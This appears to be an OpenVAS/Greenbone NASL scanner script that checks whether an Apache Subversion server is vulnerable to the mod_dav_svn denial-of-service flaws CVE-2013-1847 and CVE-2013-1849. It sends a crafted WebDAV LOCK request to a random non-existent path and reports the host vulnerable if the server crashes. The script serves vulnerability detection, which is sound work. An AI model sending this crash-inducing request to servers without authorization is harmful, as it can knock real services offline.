if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802055" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_bugtraq_id( 58897, 58323 );
	script_cve_id( "CVE-2013-1847", "CVE-2013-1849" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-06-11 12:32:36 +0530 (Tue, 11 Jun 2013)" );
	script_name( "Apache Subversion 'mod_dav_svn' Module Multiple DoS Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/52966/" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2013/Mar/56" );
	script_xref( name: "URL", value: "http://subversion.apache.org/security/CVE-2013-1847-advisory.txt" );
	script_xref( name: "URL", value: "http://subversion.apache.org/security/CVE-2013-1849-advisory.txt" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_get_http_banner.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Apache_SVN/banner" );
	script_tag( name: "affected", value: "Apache Subversion 1.6.x through 1.6.20 and 1.7.0 through 1.7.8" );
	script_tag( name: "insight", value: "An error within the 'mod_dav_svn' module when handling

  - 'LOCK' requests against a URL for a non-existent path or invalid activity
    URL that supports anonymous locks.

  - 'PROPFIND' request on an activity URL." );
	script_tag( name: "solution", value: "Upgrade to Apache Subversion version 1.6.21 or 1.7.9 or later." );
	script_tag( name: "summary", value: "The host is running Apache Subversion and is prone to multiple
  denial of service vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will let the remote attackers to cause a segfault.

  NOTE : Configurations which allow anonymous read access to the repository
  will be vulnerable." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
h_port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: h_port );
if(!banner || !IsMatchRegexp( banner, "Server: Apache.* SVN" )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: h_port );
if(http_is_dead( port: h_port )){
	exit( 0 );
}
lock_body = NASLString( "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n", "<D:lockinfo xmlns:D='DAV:'>\\n", "<D:lockscope><D:exclusive/></D:lockscope>\n", "<D:locktype><D:write/></D:locktype>\n", "<D:owner>\n", "<D:href>http://test.test</D:href>\n", "</D:owner>\n", "</D:lockinfo>\n" );
for path in nasl_make_list_unique( "/", "/repo/", "/repository/", "/trunk/", "/svn/", "/svn/trunk/", "/repo/trunk/", "/repo/projects/", "/projects/", "/svn/repos/", http_cgi_dirs( port: h_port ) ) {
	req1 = http_get( item: NASLString( path ), port: h_port );
	res1 = http_keepalive_send_recv( port: h_port, data: req1 );
	if(( !IsMatchRegexp( res1, "^HTTP/1\\.[01] 200" ) )){
		continue;
	}
	proper_path = NASLString( "LOCK ", path, " HTTP/1.1", "\\r\\n" );
	common_req = NASLString( "User-Agent: ", useragent, "\\r\\n", "Host: ", host, "\\r\\n", "Accept: */*\\r\\n", "Content-Length: ", strlen( lock_body ), "\\r\\n\\r\\n", lock_body );
	normal_req = NASLString( proper_path, common_req );
	normal_res = http_keepalive_send_recv( port: h_port, data: normal_req );
	if(IsMatchRegexp( normal_res, "^HTTP/1\\.[01] 405" )){
		continue;
	}
	rand_path = rand_str( length: 8 );
	non_existant_path = NASLString( "LOCK ", path, rand_path, " HTTP/1.1", "\\r\\n" );
	crafted_req = NASLString( non_existant_path, common_req );
	crafted_res = http_keepalive_send_recv( port: h_port, data: crafted_req );
	if(IsMatchRegexp( crafted_res, "^HTTP/1\\.[01] 401" )){
		exit( 0 );
	}
	if(isnull( crafted_res ) || strlen( crafted_res ) < 3){
		crafted_res = http_keepalive_send_recv( port: h_port, data: crafted_req );
		if(isnull( crafted_res ) || strlen( crafted_res ) < 3){
			security_message( port: h_port );
			exit( 0 );
		}
	}
	if(http_is_dead( port: h_port )){
		security_message( port: h_port );
		exit( 0 );
	}
}
exit( 99 );

